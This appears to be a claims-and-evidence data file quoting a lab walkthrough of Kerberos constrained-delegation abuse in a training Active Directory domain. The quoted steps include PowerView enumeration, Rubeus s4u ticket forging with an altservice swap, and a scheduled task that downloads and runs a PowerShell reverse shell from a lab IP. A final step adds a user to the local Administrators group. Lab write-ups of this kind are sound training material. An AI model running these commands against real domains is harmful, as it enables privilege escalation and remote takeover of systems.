items.claim: Enumerating both computer and user accounts that are trusted to authenticate for delegation (msDS-AllowedToDelegateTo) surfaces principals that can be turned into arbitrary-user access to the SPNs listed against them, including CIFS file shares.

sources.quote:
page fde14a42-6698-4fce-85a0-e12fd1672c65

Enumerating Constrained Delegation using PowerView

Get-DomainComputer -TrustedToAuth | select name

Untitled

We have the Admin SRV computer have Constrained Delegation

Let’s Check the users have Constrained Delegation

Get-DomainUser -TrustedToAuth | select name 

Untitled

As we see we have the websvc user have Constrained Delegation

Now let’s understand how it works

Untitled

If we compromised the user websvc we can access the file server (CIFS) as any user in the domain including Domain Admins

Now let’s use Rubeus to abuse the Constrained Delegation

.\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /nowrap /ptt

Untitled

Notice that we got a TGT as Administrator for the SPN CIFS

now let’s list the tickets we have

klist

Untitled

Amazing we have the Administrator Ticket 

Let’s try to list the contents of the dcorp-mssql server

ls \\dcorp-mssql.dollarcorp.moneycorp.local\C$

Untitled

Yeah We did it !

items.claim: Because the KDC does not validate the target service against the delegation grant, a constrained-delegation request nominally for one SPN can be answered with a ticket for a different SPN - the SPN actually present in the returned ticket is the proof the substitution succeeded.

items.disproof: The issued service ticket names only the SPN that was requested, or the KDC rejects the alternate service outright.

sources.quote:
Luckily Microsoft didn’t validate the service we need so we can ask trick the server to give us access to another service!

let’s explain with Rubeus

.\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /altservice:host /nowrap /ptt

Untitled

As we see we asked for access to CIFS but we got a ticket for HOST Service

let’s list the Tickets

klist

Untitled

Now let’s go and try to make a schedule task to give us reverse shell

schtasks /create /S dcorp-mssql.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'IEX(iwr http://172.16.100.22/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'"

Untitled

Now let’s start the task

schtasks /Run /S dcorp-mssql.dollarcorp.moneycorp.local /TN "STCheck"

Untitled

let’s go back to our listener 

Untitled

Hooray we are Local admin in the dcorp-mssql machine 

let’s add my user to the local admins group

net localgroup Administrators "student422" /add

Untitled

Yes we made it!
